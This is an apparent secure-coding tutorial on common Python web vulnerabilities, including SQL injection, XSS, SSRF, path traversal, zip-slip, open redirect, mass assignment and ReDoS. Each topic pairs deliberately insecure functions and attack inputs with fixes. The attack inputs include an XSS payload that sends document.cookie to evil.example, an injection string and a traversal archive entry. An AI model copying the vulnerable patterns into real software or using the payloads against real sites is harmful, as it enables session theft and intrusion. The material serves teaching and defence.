# Common Web Vulnerabilities in Python (OWASP-Style)

**Prerequisites:** [Threat modeling and secure Python](../threat-modeling/01-threat-modeling-and-secure-python.md), [authentication and authorization](../authentication/01-authn-authz-sessions-jwt.md), [SQL basics](../../05-databases/relational-sql/README.md). **You will learn:** the bugs that appear year after year in the **OWASP Top 10** list of web risks, each shown as **vulnerable code, the attack, and the fix**, with everything runnable offline: SQL injection, XSS, SSRF, path traversal, zip-slip, open redirect, mass assignment and regex denial of service (ReDoS).

## 1. In plain words

Nearly every vulnerability here is the same story: **data was treated as instructions** (injection, XSS), or **a request was trusted without checking who or what it targets** (SSRF, path traversal, access control). The cure is also the same: keep data and code separate, validate against an allow-list, and check on the server. (Access control and IDOR were covered in the [authentication lesson](../authentication/01-authn-authz-sessions-jwt.md).)

| OWASP category (theme) | In this lesson |
|------------------------|----------------|
| Injection | SQL injection (section 2) |
| Injection / cross-site scripting | XSS (section 3) |
| Server-side request forgery | SSRF (section 4) |
| Broken access control | path traversal, zip-slip, open redirect, mass assignment (sections 5 to 8) |
| Security misconfiguration | security headers (section 9) |
| Denial of service | ReDoS (section 10) |

## 2. SQL injection

The attack: input that is pasted into a SQL string becomes part of the query.

```python
import sqlite3

db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE users (name TEXT, password_hash TEXT, is_admin INT);
INSERT INTO users VALUES ('ada', 'hash-a', 0), ('root', 'hash-root', 1);
""")

def find_user_vulnerable(name: str):
    sql = f"SELECT name, is_admin FROM users WHERE name = '{name}'"      # string pasted in
    return db.execute(sql).fetchall()

def find_user_safe(name: str):
    return db.execute("SELECT name, is_admin FROM users WHERE name = ?", (name,)).fetchall()   # placeholder

attack = "x' OR '1'='1"
print(find_user_vulnerable("ada"))
# [('ada', 0)]
print(find_user_vulnerable(attack))               # the quote closes the string; OR 1=1 is always true: EVERY user returned
# [('ada', 0), ('root', 1)]
print(find_user_safe(attack))                     # the whole text is just a (non-matching) name
# []
```

**Fix:** always use **parameterized queries** (placeholders `?` or `%s`), never f-strings or `+` for SQL. ORMs do this for you, but raw-SQL escape hatches (`text(f"...")`, `.raw()`) bring the bug back. **Defence in depth:** give the application a database user with only the permissions it needs (no `DROP`, no access to other schemas). Placeholders protect **values**, not table or column names: for those, allow-list the choices (`if col not in {"name", "created"}`).

## 3. Cross-site scripting (XSS)

The attack: user-supplied text is placed into an HTML page without escaping, so the browser runs it as script in **other users' sessions** (stealing cookies, acting as them).

```python
import html

comment = '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>'

def page_vulnerable(c: str) -> str:
    return f"<div class='comment'>{c}</div>"

def page_safe(c: str) -> str:
    return f"<div class='comment'>{html.escape(c)}</div>"       # < > & " ' become harmless entities

print(page_vulnerable(comment)[:44])
# <div class='comment'><script>fetch("https://
print(page_safe(comment))
# <div class='comment'>&lt;script&gt;fetch(&quot;https://evil.example/steal?c=&quot; + document.cookie)&lt;/script&gt;</div>
```

**Fix:** **escape for the context** where data lands (HTML body, attribute, JavaScript, URL). Use a template engine with **auto-escaping** (Jinja2 with `autoescape=True`, Django templates) and treat anything marked "safe" or "raw" as dangerous. Add a **Content-Security-Policy** header (section 9) and `HttpOnly` cookies as second layers. Never build HTML with string concatenation.

## 4. Server-side request forgery (SSRF)

The attack: your server fetches a URL the user supplies (an image preview, a webhook), and the attacker supplies an **internal** address: `http://169.254.169.254/` (cloud metadata with credentials), `http://localhost:6379/` (an unprotected Redis), or an internal admin panel. The request comes from *inside* your network, so firewalls do not help.

```python
import ipaddress, socket
from urllib.parse import urlparse

def is_safe_url(url: str) -> bool:
    parts = urlparse(url)
    if parts.scheme not in {"http", "https"}:            # no file://, gopher://, ftp://
        return False
    host = parts.hostname
    if not host:
        return False
    try:
        addresses = {info[4][0] for info in socket.getaddrinfo(host, parts.port or 443)}   # resolve names too
    except socket.gaierror:
        return False
    for addr in addresses:
        ip = ipaddress.ip_address(addr)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved or ip.is_multicast:
            return False
    return True

for url in ["http://169.254.169.254/latest/meta-data/",      # cloud metadata
            "http://127.0.0.1:6379/",                        # loopback service
            "http://localhost/admin",                        # name that resolves to loopback
            "http://10.0.0.5/internal",                      # private range
            "file:///etc/passwd",                            # wrong scheme
            "http://93.184.216.34/page"]:                    # a public address
    print(f"{is_safe_url(url)!s:<5} {url}")
# False http://169.254.169.254/latest/meta-data/
# False http://127.0.0.1:6379/
# False http://localhost/admin
# False http://10.0.0.5/internal
# False file:///etc/passwd
# True  http://93.184.216.34/page
```

Resolve-then-check is **not enough on its own**: an attacker's DNS can answer with a public address for your check and a private one for the real fetch (**DNS rebinding**), and a public URL can **redirect** to an internal one. A strong defence: fetch using the **already-validated IP** (set the `Host` header yourself), **disable or re-check redirects**, set a short timeout and response-size limit, and ideally route outbound fetches through an egress proxy that blocks internal ranges. On cloud hosts, require the hardened metadata version (IMDSv2).

## 5. Path traversal

The attack: a file name such as `../../etc/passwd` escapes the folder you meant to serve.

```python
import tempfile
from pathlib import Path

base = Path(tempfile.mkdtemp()) / "uploads"
base.mkdir()
(base / "report.txt").write_text("quarterly numbers")
(base.parent / "secret.txt").write_text("TOP SECRET")                 # a file OUTSIDE the uploads folder

def read_vulnerable(name: str) -> str:
    return (base / name).read_text()

def read_safe(name: str) -> str:
    target = (base / name).resolve()                                   # collapse '..' and follow symlinks
    if not target.is_relative_to(base.resolve()):                      # must still live under base
        raise PermissionError("path escapes upload folder")
    return target.read_text()

print(read_vulnerable("report.txt"))
# quarterly numbers
print(read_vulnerable("../secret.txt"))                                # escaped the folder
# TOP SECRET
print(read_safe("report.txt"))
# quarterly numbers
try:
    read_safe("../secret.txt")
except PermissionError as e:
    print("blocked:", e)
# blocked: path escapes upload folder
```

**Fix:** resolve the full path and verify it is inside the allowed directory; better, never use user input as a path: store files under generated ids and keep the original name only as metadata. (On older Pythons use `os.path.commonpath` instead of `is_relative_to`.)

## 6. Zip-slip: the same bug inside archives

A malicious zip can contain an entry named `../../evil.txt`; naive extraction writes outside the target folder.

```python
import io, zipfile, tempfile
from pathlib import Path

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("ok.txt", "fine")
    z.writestr("../evil.txt", "written outside the folder!")

def safe_extract(data: bytes, dest: Path) -> list[str]:
    extracted = []
    dest = dest.resolve()
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        for member in z.namelist():
            target = (dest / member).resolve()
            if not target.is_relative_to(dest):
                raise PermissionError(f"unsafe path in archive: {member}")
            extracted.append(member)
        z.extractall(dest)
    return extracted

dest = Path(tempfile.mkdtemp()) / "out"
dest.mkdir()
try:
    safe_extract(buf.getvalue(), dest)
except PermissionError as e:
    print(e)
# unsafe path in archive: ../evil.txt
print(sorted(p.name for p in dest.iterdir()))                          # nothing was extracted
# []
```

(Recent Python versions ship `tarfile` extraction filters such as `filter="data"` for the same purpose; use them. Also guard against **zip bombs** by limiting total uncompressed size.)

## 7. Open redirect

The attack: `https://yoursite.com/login?next=https://evil.example` redirects the user to a look-alike page after a real login, borrowing your site's trust.

```python
from urllib.parse import urlparse

def safe_next(target: str, default: str = "/") -> str:
    parts = urlparse(target)
    if parts.scheme or parts.netloc:                      # absolute URL or //host: reject
        return default
    if not target.startswith("/") or target.startswith("//") or "\\" in target:
        return default
    return target

print([safe_next(t) for t in ["/dashboard", "https://evil.example", "//evil.example", "/\\evil.example", "profile"]])
# ['/dashboard', '/', '/', '/', '/']
```

## 8. Mass assignment

The attack: the app copies every field from the request into the database object, so the client sends `"is_admin": true` too.

```python
def update_profile_vulnerable(user: dict, payload: dict) -> dict:
    user.update(payload)                                 # whatever the client sent
    return user

ALLOWED_FIELDS = {"display_name", "bio"}

def update_profile_safe(user: dict, payload: dict) -> dict:
    user.update({k: v for k, v in payload.items() if k in ALLOWED_FIELDS})
    return user

evil = {"bio": "hi", "is_admin": True}
print(update_profile_vulnerable({"display_name": "Ada", "is_admin": False}, evil))
# {'display_name': 'Ada', 'is_admin': True, 'bio': 'hi'}
print(update_profile_safe({"display_name": "Ada", "is_admin": False}, evil))
# {'display_name': 'Ada', 'is_admin': False, 'bio': 'hi'}
```

**Fix:** an explicit allow-list or a schema (Pydantic model with only the editable fields) at every input boundary.

## 9. Security headers (misconfiguration)

A few response headers switch on browser protections:

| Header | Purpose |
|--------|---------|
| `Content-Security-Policy: default-src 'self'` | only load scripts, images, styles from your own origin: blunts XSS |
| `Strict-Transport-Security: max-age=31536000` | browser always uses HTTPS for this site |
| `X-Content-Type-Options: nosniff` | stops the browser guessing a file's type |
| `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`) | prevents clickjacking in an iframe |
| `Referrer-Policy: no-referrer` (or stricter default) | do not leak URLs |

Other misconfigurations: debug mode on in production, default passwords, verbose stack traces shown to users, open cloud storage buckets, unneeded ports and services.

## 10. Regular-expression denial of service (ReDoS)

Some regexes take exponential time on crafted input; one request can pin a CPU. Nested quantifiers such as `(a+)+` are the classic trap.

```python
import re, time

def timed(pattern: str, text: str) -> float:
    rx = re.compile(pattern)
    start = time.perf_counter()
    rx.match(text)
    return time.perf_counter() - start

bad_input = "a" * 22 + "b"                                    # almost matches, then fails at the very end
slow = timed(r"(a+)+$", bad_input)                             # exponential backtracking
fast = timed(r"a+$", bad_input)                                # linear: no nested quantifier
print(slow > 100 * fast)
# True
print(f"(a+)+$ took about {slow*1000:.0f} ms for just 23 characters; each extra 'a' roughly doubles it")
# (a+)+$ took about 150 ms for just 23 characters; each extra 'a' roughly doubles it       (time varies)
```

**Fix:** avoid nested quantifiers and overlapping alternatives, **limit input length** before matching, use `re.fullmatch` with simple patterns, set request timeouts, and consider a linear-time engine (`re2` bindings) for patterns written by users.

## 11. Common mistakes

- Escaping on input instead of on output (escape for the place the data is used).
- Using `str.replace("'", "''")` or a hand-written "sanitizer" instead of parameters.
- Checking a URL string with `startswith("http://trusted")` (`http://trusted.evil.example` passes).
- Validating file names but forgetting symlinks, encodings or `..` after decoding.
- Trusting the `Referer`, `Host` or `X-Forwarded-For` header.
- Logging full request bodies, tokens or passwords while debugging, then leaving it on.
- Leaving `debug=True` in production.
- Believing "it is an internal API, nobody will attack it".

## 12. Two real-world examples

**Example 1: The screenshot service.** A product let users enter a URL to "generate a preview". It fetched from the server, and an attacker pointed it at the cloud metadata address, receiving temporary cloud credentials in the response. Blocking internal ranges, requiring the hardened metadata service and running the fetcher in a network zone with no access to anything valuable ended it. (This pattern was behind several well-known cloud breaches.)

**Example 2: The search box.** A site reflected the search term into the page unescaped. An attacker emailed victims a link containing a script in the query string; clicking it ran the script with the victim's logged-in session. Auto-escaping templates and a Content-Security-Policy turned a critical bug into a non-issue.

## 13. Practice

1. Fix this: `db.execute("SELECT * FROM posts ORDER BY " + sort_column)`. Why can't a placeholder help here?
2. Write `safe_filename(name)` that keeps only the final path component and allows letters, digits, dot, dash and underscore.
3. Using `is_safe_url`, decide for `http://[::1]/` and `http://0.0.0.0/`. Why does the second matter?
4. Write a Pydantic-free validator that accepts a payload only if its keys are a subset of `{"title", "body"}` and raises `ValueError` otherwise (stricter than silently dropping).
5. Explain why `"http://trusted.com.evil.example".startswith("http://trusted.com")` is a broken check, and what to do instead.
6. Make the unsafe regex `(a+)+$` safe while matching the same strings.

<details>
<summary>Solutions</summary>

1. ```python
   ALLOWED_SORT = {"created", "title", "score"}
   def order_clause(sort_column: str) -> str:
       if sort_column not in ALLOWED_SORT:
           raise ValueError("bad sort column")
       return "SELECT * FROM posts ORDER BY " + sort_column        # safe: only allow-listed names reach the string
   print(order_clause("score"))
   # SELECT * FROM posts ORDER BY score
   ```
   Placeholders bind **values**; identifiers (column names) are part of the SQL structure and cannot be bound, so they must be allow-listed.
2. ```python
   import re
   from pathlib import PurePosixPath
   def safe_filename(name: str) -> str:
       base = PurePosixPath(name.replace("\\", "/")).name
       base = re.sub(r"[^A-Za-z0-9._-]", "_", base).lstrip(".")
       return base or "file"
   print(safe_filename("../../etc/passwd"), safe_filename("my report (1).pdf"))
   # passwd my_report__1_.pdf
   ```
3. ```python
   print(is_safe_url("http://[::1]/"), is_safe_url("http://0.0.0.0/"))
   # False False
   ```
   `0.0.0.0` is "this host" on many systems, so a request to it can reach local services; it is flagged as reserved and must be blocked too.
4. ```python
   def strict_payload(payload: dict) -> dict:
       extra = set(payload) - {"title", "body"}
       if extra:
           raise ValueError(f"unexpected fields: {sorted(extra)}")
       return payload
   try:
       strict_payload({"title": "t", "is_admin": True})
   except ValueError as e:
       print(e)
   # unexpected fields: ['is_admin']
   ```
5. A string prefix test says nothing about the real host: `trusted.com.evil.example` begins with `trusted.com`. Parse the URL and compare `urlparse(url).hostname` to an allow-list of exact hosts (or exact registrable domains).
6. ```python
   safe = re.compile(r"a+$")                  # one quantifier, no nesting, same language
   print(bool(safe.match("aaaa")), bool(safe.match("aaab")))
   # True False
   ```

</details>

## 14. Check yourself

1. What single habit prevents SQL injection, and what does it not cover?
2. What does escaping for context mean, and why is "sanitize on input" weaker?
3. What is SSRF, and why are DNS rebinding and redirects a problem for URL checks?
4. How do you stop path traversal and zip-slip?
5. What is mass assignment, and what is the fix?
6. Why can a short regex be an availability vulnerability?
7. Name three security headers and what they do.

<details>
<summary>Answers</summary>

1. Parameterized queries; they bind values but not identifiers, so column and table names still need allow-lists.
2. Encoding data correctly for where it is inserted (HTML, attribute, JavaScript, URL, SQL). Data can reach several contexts, so input sanitization cannot be right for all of them; output encoding is.
3. The server is tricked into fetching an attacker-chosen (often internal) URL. A host can resolve to a safe address at check time and an internal one at fetch time, and a safe URL can redirect to an internal one, so check the address actually used and control redirects.
4. Resolve the final path and verify it stays inside the allowed directory (check every archive member); prefer generated names over user-supplied ones.
5. Copying all client-supplied fields into a model so users can set privileged fields; accept only an explicit allow-list or schema.
6. Nested quantifiers cause exponential backtracking, so one crafted input can consume a CPU for seconds or hours.
7. CSP (limits what content may load), HSTS (forces HTTPS), `X-Content-Type-Options: nosniff` (no type guessing), `X-Frame-Options` or `frame-ancestors` (anti-clickjacking).

</details>

[Back to Security](../README.md)
